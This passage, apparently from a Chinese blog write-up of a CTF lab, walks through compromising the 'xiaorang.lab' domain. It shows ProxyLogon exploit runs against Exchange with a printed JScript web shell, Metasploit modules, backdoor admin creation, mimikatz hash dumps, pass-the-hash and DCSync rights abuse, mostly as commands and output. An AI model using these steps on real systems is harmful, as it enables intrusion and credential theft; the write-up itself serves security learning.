class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/auth/logon.aspx?url=https%3a%2f%2f172.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>%2fowa%2f&amp;reason=<span class="hljs-number">0</span> code:<span class="hljs-number">200</span> len:<span class="hljs-number">28237</span>  title:Outlook<br>已完成 <span class="hljs-number">18</span>/<span class="hljs-number">18</span><br><span class="hljs-string">[*]</span> 扫描结束,耗时: <span class="hljs-number">9</span>.171102981s<br></code></pre></td></tr></table></figure>
+
+<p>总结一下</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmake">(icmp) <span class="hljs-keyword">Target</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">3.12</span>     已拿下<br>(icmp) <span class="hljs-keyword">Target</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">3.2</span>      DC:XIAORANG-WIN16.xiaorang.lab，DC，Windows Server <span class="hljs-number">2016</span> Datacenter<br>(icmp) <span class="hljs-keyword">Target</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">3.9</span>      XIAORANG-EXC01.xiaorang.lab，Exchange 邮件服务器（EXC01），Windows Server <span class="hljs-number">2016</span> Datacenter<br>(icmp) <span class="hljs-keyword">Target</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">3.26</span>     XIAORANG\XIAORANG-PC，Windows Server <span class="hljs-number">2016</span> Datacenter<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>172.22.3.2：88, 139, 445, 135</li>
+<li>172.22.3.9：808, 139, 445, 443, 135, 81, 80, 8172</li>
+<li>172.22.3.12：8000, 80, 22</li>
+<li>172.22.3.26：135, 445, 139</li>
+</ul>
+<h2 id="Exchange-Server"><a href="#Exchange-Server" class="headerlink" title="Exchange Server"></a>Exchange Server</h2><p>172.22.3.9 上面有一个Outlook Web App（exchange服务）</p>
+<ul>
+<li><strong>Outlook</strong>一般指微软的<strong>电子邮件客户端软件</strong>（桌面应用），可以在 Windows、Mac、手机等平台使用。功能：收发邮件、日历、联系人、任务、会议等办公协作功能。</li>
+<li><strong>Outlook Web Access</strong>（简称 OWA），现在更常叫 <strong>Outlook Web App</strong>，是微软 Exchange 邮件服务器的一个<strong>网页端邮箱访问界面</strong>。功能：让用户通过浏览器访问企业邮箱，收发邮件、查日程、联系人、任务等，无需安装客户端。</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152208656.png" srcset="/img/loading.gif" lazyload alt="image-20250816015945712"></p>
+<h3 id="exprolog"><a href="#exprolog" class="headerlink" title="exprolog"></a>exprolog</h3><p>猜一手邮件后缀是xiaorang.lab，<code>admin@xiaorang.lab</code>没打通，<code>administrator@xiaorang.lab</code>打通了</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/herwonowr/exprolog">herwonowr&#x2F;exprolog: ProxyLogon Full Exploit Chain PoC (CVE-2021–26855, CVE-2021–26857, CVE-2021–26858, CVE-2021–27065)</a></p>
+<p>用exprolog.py 写入shell</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">proxychains python3 exprolog.py -t 172.22.3.9 -e administrator@xiaorang.lab<br><br>proxychains python3 exprolog.py -t 172.22.3.9 -e administrator@xiaorang.lab<br>[proxychains] config file found: <span class="hljs-string">/etc/proxychains4.conf</span><br>[proxychains] preloading <span class="hljs-string">/usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br>[proxychains] DLL init: proxychains-ng 4.17<br> _____      ____            _             <br>| ____|_  _|  _ \ _ __ ___ | | ___   __ _ <br>|  _| \ \/ / |_) | &#x27;__/ _ \| |/ _ \ / _` |<br>| |___ &gt;  &lt;|  __/| | | <span class="hljs-params">(_)</span> | | <span class="hljs-params">(_)</span> | <span class="hljs-params">(_| |</span><br><span class="hljs-params">|_____/_/\_\_|   |_|  \___/|_|\___/ \__, |</span><br><span class="hljs-params">                                    |___/ </span><br><span class="hljs-params"></span><br><span class="hljs-params">[#] Trying to get target FQDN</span><br><span class="hljs-params">[proxychains] Strict chain  ...  127.0.0.1:55556  ...  172.22.3.9:443  ...  OK</span><br><span class="hljs-params">[+] Got target FQDN: XIAORANG-EXC01</span><br><span class="hljs-params">[#] Trying to get target LegacyDN and ServerID</span><br><span class="hljs-params">[proxychains] Strict chain  ...  127.0.0.1:55556  ...  172.22.3.9:443  ...  OK</span><br><span class="hljs-params">[+] Got target LegacyDN: /<span class="hljs-attr">o</span>=XIAORANG LAB/<span class="hljs-attr">ou</span>=Exchange Administrative Group (FYDIBOHF23SPDLT)</span><span class="hljs-string">/cn=Recipients/cn=8ca6ff254802459d9f63ee916eabb487-Administrat</span><br>[+] Got target ServerID: b5ebdaa1-b4b3-4b71-ab32-7d03b4955a75<br>[<span class="hljs-comment">#] Trying to get target user SID</span><br>[proxychains] Strict chain  <span class="hljs-string">...</span>  127.0.0.1<span class="hljs-function">:55556</span>  <span class="hljs-string">...</span>  172.22.3.9<span class="hljs-function">:443</span>  <span class="hljs-string">...</span>  OK<br>[+] Got target administrator SID: S-1-5-21-533686307-2117412543-4200729784-500<br>[<span class="hljs-comment">#] Trying to get target administrator cookie sessions</span><br>[proxychains] Strict chain  <span class="hljs-string">...</span>  127.0.0.1<span class="hljs-function">:55556</span>  <span class="hljs-string">...</span>  172.22.3.9<span class="hljs-function">:443</span>  <span class="hljs-string">...</span>  OK<br>[+] Got target administrator session ID: 85342402-4794-4ac5-b523-10409dde4dee<br>[+] Got target administrator canary session ID: vlBxSIptCUKhHxHNUx346Iq2f4Td3N0IcbfRsJDvBOhOJslBwFY7TEoZxQU_hWE20FwAyipvZ8M.<br>[<span class="hljs-comment">#] Trying to get target OABVirtualDirectory ID</span><br>[proxychains] Strict chain  <span class="hljs-string">...</span>  127.0.0.1<span class="hljs-function">:55556</span>  <span class="hljs-string">...</span>  172.22.3.9<span class="hljs-function">:443</span>  <span class="hljs-string">...</span>  OK<br>[+] Got target AOB ID: afb15058-823b-4c37-ab8d-3012667a7d6b<br>[<span class="hljs-comment">#] Trying to inject OABVirtualDirectory Shell</span><br>[proxychains] Strict chain  <span class="hljs-string">...</span>  127.0.0.1<span class="hljs-function">:55556</span>  <span class="hljs-string">...</span>  172.22.3.9<span class="hljs-function">:443</span>  <span class="hljs-string">...</span>  OK<br>[+] Shell are injected<br>[<span class="hljs-comment">#] Verifying OABVirtualDirectory Shell</span><br>[proxychains] Strict chain  <span class="hljs-string">...</span>  127.0.0.1<span class="hljs-function">:55556</span>  <span class="hljs-string">...</span>  172.22.3.9<span class="hljs-function">:443</span>  <span class="hljs-string">...</span>  OK<br>[+] AOB Shell verified<br>[+] AOB Shell payload: http:\/\<span class="hljs-string">/ooo</span>\/<span class="hljs-comment">#%3Cscript%20language=%22JScript%22%20runat=%22server%22%3Efunction%20Page_Load()%7Beval(Request%5B%22request%22%5D,%22unsafe%22);%7D%3C\/script%3E</span><br>[<span class="hljs-comment">#] Trying to export OABVirtualDirectory Shell</span><br>[proxychains] Strict chain  <span class="hljs-string">...</span>  127.0.0.1<span class="hljs-function">:55556</span>  <span class="hljs-string">...</span>  172.22.3.9<span class="hljs-function">:443</span>  <span class="hljs-string">...</span>  OK<br>[+] Shell are exported<br>[*] CURL Request: <br>curl <span class="hljs-params">--request</span> POST <span class="hljs-params">--url</span> https:<span class="hljs-string">//172.22.3.9/owa/auth/v5mts.aspx</span> <span class="hljs-params">--header</span> &#x27;Content-Type: application/x-www-form-urlencoded&#x27; <span class="hljs-params">--data</span> &#x27;request=Response.Write<span class="hljs-params">(new ActiveXObject(&quot;WScript.Shell&quot;)</span><span class="hljs-string">.exec</span><span class="hljs-params">(&quot;whoami /all&quot;)</span><span class="hljs-string">.stdout.readall</span><span class="hljs-params">()</span>)&#x27; -k<br>[*] DONE<br>                                   <br></code></pre></td></tr></table></figure>
+
+<p>他这里回显里直接给payload了，按照他给的回显连马</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">proxychains curl <span class="hljs-params">--request</span> POST <span class="hljs-params">--url</span> https:<span class="hljs-string">//172.22.3.9/owa/auth/ca3hs.aspx</span> <span class="hljs-params">--header</span> &#x27;Content-Type: application/x-www-form-urlencoded&#x27; <span class="hljs-params">--data</span> &#x27;request=Response.Write<span class="hljs-params">(new ActiveXObject(&quot;WScript.Shell&quot;)</span><span class="hljs-string">.exec</span><span class="hljs-params">(&quot;whoami /all&quot;)</span><span class="hljs-string">.stdout.readall</span><span class="hljs-params">()</span>)&#x27; -k  <br></code></pre></td></tr></table></figure>
+
+<h3 id="proxylogon"><a href="#proxylogon" class="headerlink" title="proxylogon"></a>proxylogon</h3><p><a target="_blank" rel="noopener" href="https://github.com/RickGeex/ProxyLogon">RickGeex&#x2F;ProxyLogon：ProxyLogon 是 CVE-2021-26855 的正式通用名称，该漏洞存在于 Microsoft Exchange Server 上，允许攻击者绕过认证，冒充管理员。我们还将该漏洞与另一个授权后任意写入漏洞 CVE-2021-27065 串联起来，以实现代码执行。 — RickGeex&#x2F;ProxyLogon: ProxyLogon is the formally generic name for CVE-2021-26855, a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the authentication and impersonating as the admin. We have also chained this bug with another post-auth arbitrary-file-write vulnerability, CVE-2021-27065, to get code execution.</a></p>
+<p>用proxylogon可以直接命令执行</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> python2 proxylogon.py <span class="hljs-number">172.22.3.9</span> administrator<span class="hljs-variable">@xiaorang</span>.lab<br></code></pre></td></tr></table></figure>
+
+<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>msf也可以打：</p>
+<ul>
+<li><code>exploit/windows/http/exchange_proxylogon_rce</code>：利用 ProxyLogon 漏洞进行远程代码执行（需加载最新模块库）。</li>
+<li><code>exploit/windows/http/exchange_proxyshell_rce</code>：利用 ProxyShell 漏洞，攻击新版 Exchange。</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/http/exchange_proxylogon_rce<br><span class="hljs-built_in">set</span> RHOSTS 172.22.3.9<br><span class="hljs-built_in">set</span> RPORT 443    # 默认就是 Exchange Web 服务端口443，非443改成对应端口<br><span class="hljs-built_in">set</span> EMAIL administrator@xiaorang.lab<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> LPORT 54530<br><span class="hljs-built_in">run</span><br><br>use exploit/windows/http/exchange_proxyshell_rce<br><span class="hljs-built_in">set</span> RHOSTS 172.22.3.9<br><span class="hljs-built_in">set</span> EMAIL administrator@xiaorang.lab<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> LPORT 54531<br>run<br></code></pre></td></tr></table></figure>
+
+<p>可以创个用户连过去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user matrix Matrix2025! /add<br>net localgroup administrators matrix /add<br>net user matrix /domain<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br><br><span class="hljs-comment"># 这里不加域，加域连不上。如果你不需要 Kerberos/域认证，可以尝试不用 /d: 参数</span><br>proxychains xfreerdp3 /u:matrix /p:Matrix2025! /d:xiaorang.lab /v:172.22.3.9 /cert:ignore <br>proxychains xfreerdp3 /u:matrix /p:Matrix2025! /v:172.22.3.9 /cert:ignore <br></code></pre></td></tr></table></figure>
+
+<p>拿flag</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152208549.png" srcset="/img/loading.gif" lazyload alt="image-20250815203547399"></p>
+<h1 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h1><p>如果之前不用msf的话，可以现在上后门</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> RHOST 172.22.3.9<br><span class="hljs-built_in">set</span> LPORT 54524<br>run<br></code></pre></td></tr></table></figure>
+
+<p>这里本来想信息分析一下，但是由于我们新建的用户不在域内，所以bloodhound抓不到东西</p>
+<h2 id="logonpasswords"><a href="#logonpasswords" class="headerlink" title="logonpasswords"></a>logonpasswords</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>接着传个mimikatz，抓取哈希</p>
+<blockquote>
+<p>要用管理员打开mimikatz</p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">log<br>privilege::Debug <span class="hljs-comment"># 这条执行不成功，但是不影响</span><br>sekurlsa::logonpasswords <br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+
+<p><strong><code>kiwi_cmd &quot;sekurlsa::logonpasswords&quot;</code></strong>：这是 Mimikatz 的经典命令，用于<strong>抓取当前主机所有已登录账户的明文密码、hash、票据等</strong>。</p>
+<h3 id="msf-1"><a href="#msf-1" class="headerlink" title="msf"></a>msf</h3><p>可以用msf来加载</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">load</span> kiwi<br>kiwi_cmd <span class="hljs-string">&quot;privilege::debug&quot;</span><br>kiwi_cmd <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>抓到两个有用的hash</p>
+<p>一个是机器用户的hash，一个是用户zhangtong</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs nix">Authentication <span class="hljs-params">Id :</span> <span class="hljs-number">0</span> ; <span class="hljs-number">1887841</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">001</span>cce61)<br><span class="hljs-params">Session           :</span> RemoteInteractive from <span class="hljs-number">2</span><br>User <span class="hljs-params">Name         :</span> Zhangtong<br><span class="hljs-params">Domain            :</span> XIAORANG<br>Logon <span class="hljs-params">Server      :</span> XIAORANG-WIN16<br>Logon <span class="hljs-params">Time        :</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/8/15</span> <span class="hljs-number">20</span>:<span class="hljs-number">20</span>:<span class="hljs-number">16</span><br><span class="hljs-params">SID               :</span> S-<span class="hljs-number">1</span><span class="hljs-operator">-</span><span class="hljs-number">5</span><span class="hljs-operator">-</span><span class="hljs-number">2</span>1-<span class="hljs-number">53368630</span>7-<span class="hljs-number">211741254</span>3-<span class="hljs-number">420072978</span>4-<span class="hljs-number">1147</span><br>        <span class="hljs-params">msv :</span><br>         [<span class="hljs-number">00000003</span>] Primary<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Username :</span> Zhangtong<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Domain   :</span> XIAORANG<br>         <span class="hljs-operator">*</span> <span class="hljs-params">NTLM     :</span> <span class="hljs-number">22</span>c7f81993e96ac83ac2f3f1903de8b4<br>         <span class="hljs-operator">*</span> <span class="hljs-params">SHA1     :</span> <span class="hljs-number">4</span>d205f752e28b0a13e7a2da2a956d46cb9d9e01e<br>         <span class="hljs-operator">*</span> <span class="hljs-params">DPAPI    :</span> ed14c3c4ef895b1d11b04fb4e56bb83b<br>        <span class="hljs-params">tspkg :</span><br>        <span class="hljs-params">wdigest :</span><br>         <span class="hljs-operator">*</span> <span class="hljs-params">Username :</span> Zhangtong<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Domain   :</span> XIAORANG<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Password :</span> (<span class="hljs-literal">null</span>)<br>        <span class="hljs-params">kerberos :</span><br>         <span class="hljs-operator">*</span> <span class="hljs-params">Username :</span> Zhangtong<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Domain   :</span> XIAORANG.LAB<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Password :</span> (<span class="hljs-literal">null</span>)<br>        <span class="hljs-params">ssp :</span><br>        <span class="hljs-params">credman :</span><br>Authentication <span class="hljs-params">Id :</span> <span class="hljs-number">0</span> ; <span class="hljs-number">996</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003</span>e4)<br><span class="hljs-params">Session           :</span> Service from <span class="hljs-number">0</span><br>User <span class="hljs-params">Name         :</span> XIAORANG-EXC01$<br><span class="hljs-params">Domain            :</span> XIAORANG<br>Logon <span class="hljs-params">Server      :</span> (<span class="hljs-literal">null</span>)<br>Logon <span class="hljs-params">Time        :</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/8/15</span> <span class="hljs-number">20</span>:<span class="hljs-number">18</span>:<span class="hljs-number">43</span><br><span class="hljs-params">SID               :</span> S-<span class="hljs-number">1</span><span class="hljs-operator">-</span><span class="hljs-number">5</span><span class="hljs-operator">-</span><span class="hljs-number">20</span><br>        <span class="hljs-params">msv :</span><br>         [<span class="hljs-number">00000003</span>] Primary<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Username :</span> XIAORANG-EXC01$<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Domain   :</span> XIAORANG<br>         <span class="hljs-operator">*</span> <span class="hljs-params">NTLM     :</span> <span class="hljs-number">766</span>a276a053f370d92eaf25c243f1124<br>         <span class="hljs-operator">*</span> <span class="hljs-params">SHA1     :</span> de47c096cd43e244984f43517ae52678d06318da<br>        <span class="hljs-params">tspkg :</span><br>        <span class="hljs-params">wdigest :</span><br>         <span class="hljs-operator">*</span> <span class="hljs-params">Username :</span> XIAORANG-EXC01$<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Domain   :</span> XIAORANG<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Password :</span> (<span class="hljs-literal">null</span>)<br>        <span class="hljs-params">kerberos :</span><br>         <span class="hljs-operator">*</span> <span class="hljs-params">Username :</span> xiaorang-exc01$<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Domain   :</span> XIAORANG.LAB<br>         <span class="hljs-operator">*</span> <span class="hljs-params">Password :</span> (<span class="hljs-literal">null</span>)<br>        <span class="hljs-params">ssp :</span><br>        credman :<br></code></pre></td></tr></table></figure>
+
+<h6 id="？PTH"><a href="#？PTH" class="headerlink" title="？PTH"></a>？PTH</h6><p>可以PTH，依旧是msf或者impacket</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">proxychains impacket-psexec xiaorang.lab/XIAORANG-EXC01\<span class="hljs-variable">$@172</span>.22.3.9 -hashes <span class="hljs-string">&#x27;:766a276a053f370d92eaf25c243f1124&#x27;</span> -codec gbk<br><br><br>use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> RHOSTS 172.22.3.9<br><span class="hljs-built_in">set</span> SMBUser XIAORANG-EXC01$<br><span class="hljs-built_in">set</span> SMBPass 00000000000000000000000000000000:766a276a053f370d92eaf25c243f1124<br><span class="hljs-built_in">set</span> SMBDomain xiaorang.lab<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> LPORT 54525<br>run<br></code></pre></td></tr></table></figure>
+
+<h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>接下来利用system权限用bloodhound信息收集一波</p>
+<p>运行bloodhound</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sudo neo4j start<br><br><span class="hljs-string">./BloodHound</span> <span class="hljs-params">--no-sandbox</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Sharphound"><a href="#Sharphound" class="headerlink" title="Sharphound"></a>Sharphound</h3><p>我们可以登录到 <strong>XIAORANG-EXC01</strong> 这台机器，然后用 Sharphound 工具进行权限分析。</p>
+<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r">SharpHound.exe <span class="hljs-operator">-</span><span class="hljs-built_in">c</span> <span class="hljs-built_in">all</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="bloodhound-python"><a href="#bloodhound-python" class="headerlink" title="bloodhound-python"></a>bloodhound-python</h3><p>用bloodhound-python工具收集更方便</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 安装bloodhound-python：pipx install bloodhound</span><br>proxychains4 bloodhound-python -u <span class="hljs-string">&quot;XIAORANG-EXC01$&quot;</span> <span class="hljs-params">--hashes</span> <span class="hljs-function">:766a276a053f370d92eaf25c243f1124</span> -d xiaorang.lab -dc XIAORANG-WIN16.xiaorang.lab -c all <span class="hljs-params">--dns-tcp</span> -ns 172.22.3.2 <span class="hljs-params">--auth-method</span> ntlm <span class="hljs-params">--zip</span><br></code></pre></td></tr></table></figure>
+
+<p>RDP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 不知道为啥，这里上不了RDP</span><br>proxychains xfreerdp3 /u:XIAORANG-EXC01$ /pth:766a276a053f370d92eaf25c243f1124 /v:172.22.3.9 /d:xiaorang.lab /cert:ignore<br>proxychains xfreerdp3 /u:administrator /pth:7acbc09a6c0efd81bfa7d5a1d4238beb /v:172.22.3.9 /d:xiaorang.lab /cert:ignore<br><br><span class="hljs-comment"># 可能是没开启Restricted Admin Mode，需要在目标机器上（或通过组策略）开启</span><br>reg add <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="WriteDacl"><a href="#WriteDacl" class="headerlink" title="WriteDacl"></a>WriteDacl</h2><p>分析后也可以发现，EXC01 这个机器账号默认对域里的其他成员有 <strong>WriteDACL</strong> 权限。</p>
+<p><strong>WriteDACL</strong> 权限允许我们修改指定对象的访问控制列表（ACL），也就是说，我们可以给别的账号“加权限”。比如，我们可以把 <strong>DCSync</strong> 权限加到 Zhangtong 这个用户身上，这样 Zhangtong 就可以用来抓取域控（域控制器）上的密码哈希了。</p>
+<p><strong>DCSync</strong> 是一种常用的“域渗透”技术，已经集成在 Mimikatz  工具里。在 DCSync  功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。mimikatz在2015年添加了DCSync功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash。</p>
+<p>所以，当发现 EXC01 这个机器账户有 WriteDACL 权限时，我们就可以用它来修改其他用户的权限，给 Zhangtong 加上 DCSync权限。这样 Zhangtong 就能远程抓取域控的哈希值了。</p>
+<p>简而言之：</p>
+<p><strong>EXC01 可以修改域用户的权限 → 给 Zhangtong 加 DCSync 权限 → 用 Zhangtong 导出域控哈希。</strong></p>
+<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><p>PowerView属于PowerSploit 工具集。</p>
+<p>可以给加个DCSync或者genericall权限，这样就可以dump域控的哈希</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\PowerView.ps1;<br>Add-DomainObjectAcl -TargetIdentity <span class="hljs-string">&quot;DC=xiaorang,DC=lab&quot;</span> -PrincipalIdentity XIAORANG-EXC01$ -Rights DCSync<br></code></pre></td></tr></table></figure>
+
+<p>如果上了meterpreter的话，似乎也可以直接</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">load powershell<br>powershell_import <span class="hljs-regexp">/root/</span>Desktop/PowerView.ps1 <span class="hljs-comment"># 直接换成你的路径</span><br>powershell_execute <span class="hljs-string">&quot;Add-DomainObjectAcl -TargetIdentity &#x27;DC=xiaorang,DC=lab&#x27; -PrincipalIdentity &#x27;XIAORANG-EXC01$&#x27; -Rights DCSync&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>不过我没试PowerView，而是直接用的下面的工具</p>
+<h3 id="impacket-dacledit"><a href="#impacket-dacledit" class="headerlink" title="impacket-dacledit"></a>impacket-dacledit</h3><p>impacket工具集，加上dcsync权限</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 失败，新建的用户不在域内</span><br>proxychains impacket<span class="hljs-literal">-dacledit</span> xiaorang.lab/XIAORANG<span class="hljs-literal">-EXC01</span>\<span class="hljs-variable">$</span> <span class="hljs-literal">-hashes</span> :<span class="hljs-number">766</span>a276a053f370d92eaf25c243f1124  <span class="hljs-literal">-action</span> <span class="hljs-built_in">write</span> <span class="hljs-literal">-rights</span> DCSync <span class="hljs-literal">-principal</span> matrix <span class="hljs-literal">-target-dn</span> <span class="hljs-string">&quot;DC=xiaorang,DC=lab&quot;</span> <span class="hljs-literal">-dc-ip</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">3.2</span><br><br><span class="hljs-comment"># 成功</span><br>proxychains impacket<span class="hljs-literal">-dacledit</span> xiaorang.lab/XIAORANG<span class="hljs-literal">-EXC01</span>\<span class="hljs-variable">$</span> <span class="hljs-literal">-hashes</span> :<span class="hljs-number">766</span>a276a053f370d92eaf25c243f1124 <span class="hljs-literal">-action</span> <span class="hljs-built_in">write</span> <span class="hljs-literal">-rights</span> DCSync <span class="hljs-literal">-principal</span> XIAORANG<span class="hljs-literal">-EXC01</span><span class="hljs-variable">$</span> <span class="hljs-literal">-target-dn</span> <span 